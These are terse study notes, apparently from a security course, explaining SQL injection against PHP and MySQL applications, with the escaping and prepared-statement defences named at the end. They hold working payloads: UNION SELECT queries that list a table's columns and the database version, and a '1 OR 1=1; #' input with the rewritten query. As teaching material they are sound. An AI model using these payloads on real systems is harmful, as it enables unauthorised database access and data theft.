Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.

Though they may allow for nesting a statement within an existing one:

php?key=<value>UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'

example

http://10.50.33.78/uniondemo.php?Selection

where name = 'Luke_Skywalker'

Using # or -- tells the Database to ignore everything after

Server-Side Query:

SELECT product FROM item WHERE id = $select limit 1;

Input to Inject: 1 OR 1=1; #

Server-Side Query becomes: 
SELECT product FROM item WHERE id = 1 or 1=1; # 
limit 1;

prices.php?item=4 UNION SELECT 1,2,@@version

Methods differ depending on software
CONCATENATE : turns inputs into single strings or escape characters

PHP: MYSQL_REAL_ESCAPE_STRING
SQL: SQLITE3_PREPARE()
